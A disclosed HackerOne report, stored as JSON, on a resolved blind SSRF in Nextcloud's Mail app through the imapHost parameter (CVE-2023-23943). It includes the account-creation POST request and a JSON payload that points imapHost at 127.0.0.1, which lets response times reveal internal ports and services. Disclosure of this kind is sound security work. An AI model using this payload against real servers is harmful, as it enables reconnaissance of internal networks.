@@ -1,0 +1,188 @@
+{
+  "id": 1736390,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzM2Mzkw",
+  "url": "https://hackerone.com/reports/1736390",
+  "title": "Mail app - blind SSRF via imapHost parameter",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-10-15T21:08:17.568Z",
+  "submitted_at": "2022-10-15T21:08:17.663Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "supr4s",
+    "url": "/supr4s",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cnms4l7faunf0sht0ox61ouwsqlj/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-23943"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-02-06T21:27:12.921Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-02-06T21:27:12.813Z",
+  "team_member_agreed_on_going_public_at": "2023-02-06T09:48:04.891Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi everyone,\n\nI would like to report here a Blind SSRF vulnerability through the Nextcloud `Mail` application.\n\nTested on latest Mail release : `2.0.1`\n\n## Steps To Reproduce:\n\nDuring the connection process of a mail account on the integrated Mail application of Nextcloud, once all the fields validated (IMAP, STMP etc) the following POST request is made: \n\n```\nPOST /apps/mail/api/accounts HTTP/2\nHost: redacted\nCookie: redacted\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\nAccept: application/json, text/plain, */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nRequesttoken: redacted\nContent-Length: 333\nOrigin:  redacted\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\n{\"imapHost\":\"myimapserver.org\",\"imapPort\":993,\"imapSslMode\":\"tls\",\"imapUser\":\"xxx@xxx.org\",\"imapPassword\":\"xxx\",\"smtpHost\":\"mysmtpserver.org\",\"smtpPort\":465,\"smtpSslMode\":\"tls\",\"smtpUser\":\"xxx@xxx.org\",\"smtpPassword\":\"xxx\",\"accountName\":\"xxx@xxx.orgr\",\"emailAddress\":\"xxx@xxx.org\"}\n```\n\nFrom there, the SSRF will take place with the `imapHost` parameter and the desired port number with the `imapPort` parameter.\n\nWe can already confirm this with a hit to my burp Collaborator instance \n\n{F1987615}\n\nWe can then use this for a port scan based on the response time.\nResponse time < 100ms = port closed/no listening on it.\nPort > 1000ms response, port open, listening with a service on it. Here I will scan my server locally: \n\n```\n{\"imapHost\":\"127.0.0.1\",\"imapPort\":<port_number>,\"imapSslMode\":\"none\",\"imapUser\":\"xxx@xxx.org\",\"imapPassword\":\"xxx\",\"smtpSslMode\":\"none\",\"smtpUser\":\"xxx@xxx.org\",\"smtpPassword\":\"xxx\",\"accountName\":\"xxx@xxx.org\",\"emailAddress\":\"xxx@xxx.org\"}\n```\nIt is important here to leave the parameter `imapSslMode` on `none` ! \n\n{F1987665}\n\nTo automate, this can be done with the Intruder tool from Burp Suite.\nAnd here the result on my server : \n\n```\nPort 80 - response time : 5200ms - Apache2 service\nPort 443 - response time : 5200ms - Apache2 service\nPort 8080 - response time 5140ms - CrowdSec\nPort 6060 - response time 5180ms - CrowdSec\nPort 5432 - response time 5191ms -  PostgreSQL\nPort 6379 - response time 5216ms - My Redis instance for Nextcloud\n```\n\n{F1987657}\n\nI tried a lot to increase the impact of this totally blind SSRF, I don't think it is possible to increase the impact of this vulnerability.\n\n## Impact\n\nFrom [OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) : \n\n> SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).\n\nWe are here on a totally Blind SSRF vulnerability.\n\nThis vulnerability can be exploited by any user, regardless of their rights, as long as the `mail` application is installed and enabled. A malicious person can therefore retrieve the services running locally on the server, scan your internal network for interesting information about which IPs are responding, which services are running on each IP address, etc.\n\nLooking forward to exchanging.\n\nRegards,\nSupr4s",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1987615,
+      "file_name": "Capture_d__cran_du_2022-10-15_22-35-14.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/byz6tf41wmxjwljj8y8bclmlh2g5?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2022-10-15_22-35-14.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2022-10-15_22-35-14.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUCCA7DHD%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143141Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCNox6LnbfpsPOZ24SuZD7SmUMmnFMuBhNP0OFwfet0AiEAkpKyZ6f33SCVR9y0RcPuuExpLASkm5tZYyuJ7xP69uUqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDB%2Fr24bZLdxj8YwLKCqNBQZgUxNfuMJKIjx6tEuwLTQsXeaklTKPeMOwlhh4PwU%2F0tQ%2FtjR6k354HaHRD8XPh1ADfQxe3g2Ipn1LlV%2Fg19va7dN8NTBOYDmNzxhjHPJB1HXNn0bTlXm9rK87zq5vvXuRGXjTHZhXK4kMLiLsBkIDigJ0zFf4W0HDjcvJ44h1onKKRin0jORarhhZ%2BSFG3aPK3il8DiwiVDnc%2BSNzkaUkiwDfVfQ%2FQcw2ezgDh73EjOCYjuKPs8%2BcS8Wt3dg%2Fvlk9xxbqtuGRBe7OQ%2Fe58533M%2B4dfdcQMTPecQM3cXtwsFk%2FBtQixozl9vu8zww2o8x7Tt9FE4j%2FLBSiUWeK2XfkAZ0wwxxthtyCHFoUrv1iHkpZiLMpxTBESjaRCPVdzroU%2BsZ2ZXMbM1zN6AtvMlSYS58%2F2LFs6NwXHs4jzQgetMbS4TpIQKWT%2FsNGg%2FNISM8ELEA%2B5JP0NCh02SsjsoNlmA0c1QA5e0dVmZ%2F1szagat7B2DTfNmJKOmYUxzFIQ5gmjaEbIKCFZFAiF9h6I6BELMPURPw6%2FhynUHGSTFzb0Icg6%2B64sY%2FfDAxUGg0aBy5Gv5IyJXeYelmy6PeITj7n53UbX7X25SbXU23u4tCK7TRUAk%2F5LqsDdb0O%2FS2L7RPtIj0NHvPStoGPxxFhOlc2kQr%2Fva%2BHisWjnr9wQY4mEFpaThb4fcYaSO9SrCvVfPsDpLztRCJPs7nMowbFn4HXw1eLYUWkx%2FHFej7%2FznLYOhoL%2FtcOc1gPDjwk1qTcmHEHtVeisBKLyujEgszyMBG3icYpnYDJ3R4MWDYwhm069Wvem4%2Fhrt70H6eUkOpwp2VmRYbmNSdCwkEAWCiYcnB3JogYC9wpAoNH8q11MIfkra4GOrEB%2F81%2BY5pxMTNL3a7EKdOqnVWH149lCRgren6Mrg8PA7NsPUnghYBxjEvW7W0E6%2BAU2DxWOz1LxkPw6EzcXw3eufNxT2%2FMibPxbxPxwRw%2FLyT%2BST8mhsA80mZfUodvHSc%2B9MxjYsE0N3Y10dhMTHBLi%2FHumzhIWTtBWYrLroI6yOS2%2FgzCookRUFF5lam556jhf3xzicP75lgPdUwdZ4oDfMRWIAT19boE5ADx98CSHozY&X-Amz-SignedHeaders=host&X-Amz-Signature=a807f1cb14d2ddf20d3ee3992c96fb4e5a45bdb11304e8766871f952b3c305be",
+      "file_size": 205257,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1987620,
+      "file_name": "dcd445133acdbe59f14c5df1334c8ae4.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dibfrqi9j174b3ixfeulupstl5rt?response-content-disposition=attachment%3B%20filename%3D%22dcd445133acdbe59f14c5df1334c8ae4.png%22%3B%20filename%2A%3DUTF-8%27%27dcd445133acdbe59f14c5df1334c8ae4.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUCCA7DHD%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143141Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCNox6LnbfpsPOZ24SuZD7SmUMmnFMuBhNP0OFwfet0AiEAkpKyZ6f33SCVR9y0RcPuuExpLASkm5tZYyuJ7xP69uUqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDB%2Fr24bZLdxj8YwLKCqNBQZgUxNfuMJKIjx6tEuwLTQsXeaklTKPeMOwlhh4PwU%2F0tQ%2FtjR6k354HaHRD8XPh1ADfQxe3g2Ipn1LlV%2Fg19va7dN8NTBOYDmNzxhjHPJB1HXNn0bTlXm9rK87zq5vvXuRGXjTHZhXK4kMLiLsBkIDigJ0zFf4W0HDjcvJ44h1onKKRin0jORarhhZ%2BSFG3aPK3il8DiwiVDnc%2BSNzkaUkiwDfVfQ%2FQcw2ezgDh73EjOCYjuKPs8%2BcS8Wt3dg%2Fvlk9xxbqtuGRBe7OQ%2Fe58533M%2B4dfdcQMTPecQM3cXtwsFk%2FBtQixozl9vu8zww2o8x7Tt9FE4j%2FLBSiUWeK2XfkAZ0wwxxthtyCHFoUrv1iHkpZiLMpxTBESjaRCPVdzroU%2BsZ2ZXMbM1zN6AtvMlSYS58%2F2LFs6NwXHs4jzQgetMbS4TpIQKWT%2FsNGg%2FNISM8ELEA%2B5JP0NCh02SsjsoNlmA0c1QA5e0dVmZ%2F1szagat7B2DTfNmJKOmYUxzFIQ5gmjaEbIKCFZFAiF9h6I6BELMPURPw6%2FhynUHGSTFzb0Icg6%2B64sY%2FfDAxUGg0aBy5Gv5IyJXeYelmy6PeITj7n53UbX7X25SbXU23u4tCK7TRUAk%2F5LqsDdb0O%2FS2L7RPtIj0NHvPStoGPxxFhOlc2kQr%2Fva%2BHisWjnr9wQY4mEFpaThb4fcYaSO9SrCvVfPsDpLztRCJPs7nMowbFn4HXw1eLYUWkx%2FHFej7%2FznLYOhoL%2FtcOc1gPDjwk1qTcmHEHtVeisBKLyujEgszyMBG3icYpnYDJ3R4MWDYwhm069Wvem4%2Fhrt70H6eUkOpwp2VmRYbmNSdCwkEAWCiYcnB3JogYC9wpAoNH8q11MIfkra4GOrEB%2F81%2BY5pxMTNL3a7EKdOqnVWH149lCRgren6Mrg8PA7NsPUnghYBxjEvW7W0E6%2BAU2DxWOz1LxkPw6EzcXw3eufNxT2%2FMibPxbxPxwRw%2FLyT%2BST8mhsA80mZfUodvHSc%2B9MxjYsE0N3Y10dhMTHBLi%2FHumzhIWTtBWYrLroI6yOS2%2FgzCookRUFF5lam556jhf3xzicP75lgPdUwdZ4oDfMRWIAT19boE5ADx98CSHozY&X-Amz-SignedHeaders=host&X-Amz-Signature=db32b43663f8d196ca82f687151622ff19caa3c983ba16b5fe3a011093b0f486",
+      "file_size": 23183,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1987657,
+      "file_name": "Capture_d__cran_du_2022-10-15_22-53-34.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dwxahl5pu28ne6gn2qebco5uw4k8?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2022-10-15_22-53-34.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2022-10-15_22-53-34.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUCCA7DHD%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143141Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCNox6LnbfpsPOZ24SuZD7SmUMmnFMuBhNP0OFwfet0AiEAkpKyZ6f33SCVR9y0RcPuuExpLASkm5tZYyuJ7xP69uUqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDB%2Fr24bZLdxj8YwLKCqNBQZgUxNfuMJKIjx6tEuwLTQsXeaklTKPeMOwlhh4PwU%2F0tQ%2FtjR6k354HaHRD8XPh1ADfQxe3g2Ipn1LlV%2Fg19va7dN8NTBOYDmNzxhjHPJB1HXNn0bTlXm9rK87zq5vvXuRGXjTHZhXK4kMLiLsBkIDigJ0zFf4W0HDjcvJ44h1onKKRin0jORarhhZ%2BSFG3aPK3il8DiwiVDnc%2BSNzkaUkiwDfVfQ%2FQcw2ezgDh73EjOCYjuKPs8%2BcS8Wt3dg%2Fvlk9xxbqtuGRBe7OQ%2Fe58533M%2B4dfdcQMTPecQM3cXtwsFk%2FBtQixozl9vu8zww2o8x7Tt9FE4j%2FLBSiUWeK2XfkAZ0wwxxthtyCHFoUrv1iHkpZiLMpxTBESjaRCPVdzroU%2BsZ2ZXMbM1zN6AtvMlSYS58%2F2LFs6NwXHs4jzQgetMbS4TpIQKWT%2FsNGg%2FNISM8ELEA%2B5JP0NCh02SsjsoNlmA0c1QA5e0dVmZ%2F1szagat7B2DTfNmJKOmYUxzFIQ5gmjaEbIKCFZFAiF9h6I6BELMPURPw6%2FhynUHGSTFzb0Icg6%2B64sY%2FfDAxUGg0aBy5Gv5IyJXeYelmy6PeITj7n53UbX7X25SbXU23u4tCK7TRUAk%2F5LqsDdb0O%2FS2L7RPtIj0NHvPStoGPxxFhOlc2kQr%2Fva%2BHisWjnr9wQY4mEFpaThb4fcYaSO9SrCvVfPsDpLztRCJPs7nMowbFn4HXw1eLYUWkx%2FHFej7%2FznLYOhoL%2FtcOc1gPDjwk1qTcmHEHtVeisBKLyujEgszyMBG3icYpnYDJ3R4MWDYwhm069Wvem4%2Fhrt70H6eUkOpwp2VmRYbmNSdCwkEAWCiYcnB3JogYC9wpAoNH8q11MIfkra4GOrEB%2F81%2BY5pxMTNL3a7EKdOqnVWH149lCRgren6Mrg8PA7NsPUnghYBxjEvW7W0E6%2BAU2DxWOz1LxkPw6EzcXw3eufNxT2%2FMibPxbxPxwRw%2FLyT%2BST8mhsA80mZfUodvHSc%2B9MxjYsE0N3Y10dhMTHBLi%2FHumzhIWTtBWYrLroI6yOS2%2FgzCookRUFF5lam556jhf3xzicP75lgPdUwdZ4oDfMRWIAT19boE5ADx98CSHozY&X-Amz-SignedHeaders=host&X-Amz-Signature=23ce4a0e99431116f4c6cd4e8c2e1dd3b8c82b7bc5f19f9ba6665b80fb844d11",
+      "file_size": 58812,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1987665,
+      "file_name": "Capture_d__cran_du_2022-10-15_22-59-56.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ekp6zd5fqestsm2fzpiwz19hqvm5?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2022-10-15_22-59-56.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2022-10-15_22-59-56.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUCCA7DHD%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143141Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHCNox6LnbfpsPOZ24SuZD7SmUMmnFMuBhNP0OFwfet0AiEAkpKyZ6f33SCVR9y0RcPuuExpLASkm5tZYyuJ7xP69uUqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDB%2Fr24bZLdxj8YwLKCqNBQZgUxNfuMJKIjx6tEuwLTQsXeaklTKPeMOwlhh4PwU%2F0tQ%2FtjR6k354HaHRD8XPh1ADfQxe3g2Ipn1LlV%2Fg19va7dN8NTBOYDmNzxhjHPJB1HXNn0bTlXm9rK87zq5vvXuRGXjTHZhXK4kMLiLsBkIDigJ0zFf4W0HDjcvJ44h1onKKRin0jORarhhZ%2BSFG3aPK3il8DiwiVDnc%2BSNzkaUkiwDfVfQ%2FQcw2ezgDh73EjOCYjuKPs8%2BcS8Wt3dg%2Fvlk9xxbqtuGRBe7OQ%2Fe58533M%2B4dfdcQMTPecQM3cXtwsFk%2FBtQixozl9vu8zww2o8x7Tt9FE4j%2FLBSiUWeK2XfkAZ0wwxxthtyCHFoUrv1iHkpZiLMpxTBESjaRCPVdzroU%2BsZ2ZXMbM1zN6AtvMlSYS58%2F2LFs6NwXHs4jzQgetMbS4TpIQKWT%2FsNGg%2FNISM8ELEA%2B5JP0NCh02SsjsoNlmA0c1QA5e0dVmZ%2F1szagat7B2DTfNmJKOmYUxzFIQ5gmjaEbIKCFZFAiF9h6I6BELMPURPw6%2FhynUHGSTFzb0Icg6%2B64sY%2FfDAxUGg0aBy5Gv5IyJXeYelmy6PeITj7n53UbX7X25SbXU23u4tCK7TRUAk%2F5LqsDdb0O%2FS2L7RPtIj0NHvPStoGPxxFhOlc2kQr%2Fva%2BHisWjnr9wQY4mEFpaThb4fcYaSO9SrCvVfPsDpLztRCJPs7nMowbFn4HXw1eLYUWkx%2FHFej7%2FznLYOhoL%2FtcOc1gPDjwk1qTcmHEHtVeisBKLyujEgszyMBG3icYpnYDJ3R4MWDYwhm069Wvem4%2Fhrt70H6eUkOpwp2VmRYbmNSdCwkEAWCiYcnB3JogYC9wpAoNH8q11MIfkra4GOrEB%2F81%2BY5pxMTNL3a7EKdOqnVWH149lCRgren6Mrg8PA7NsPUnghYBxjEvW7W0E6%2BAU2DxWOz1LxkPw6EzcXw3eufNxT2%2FMibPxbxPxwRw%2FLyT%2BST8mhsA80mZfUodvHSc%2B9MxjYsE0N3Y10dhMTHBLi%2FHumzhIWTtBWYrLroI6yOS2%2FgzCookRUFF5lam556jhf3xzicP75lgPdUwdZ4oDfMRWIAT19boE5ADx98CSHozY&X-Amz-SignedHeaders=host&X-Amz-Signature=38cb11effd5b5c9c2246d859570960f0dc755776b23a1e46ca6dac1146b5950a",
+      "file_size": 154971,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-03-08T09:48:04.986Z",
+  "allow_singular_disclosure_after": -29565816.92608908,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "7odamoo",
+    "zy9ard3",
+    "shubham_srt",
+    "shivammusic",
+    "diaaa",
+    "hrbrtschmull",
+    "jesthy",
+    "unknown1122w",
+    "lamentomori"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 45132,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/mail",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 248858,
+      "category": "team",
+      "content": "Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-8gcx-r739-9pf6",
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
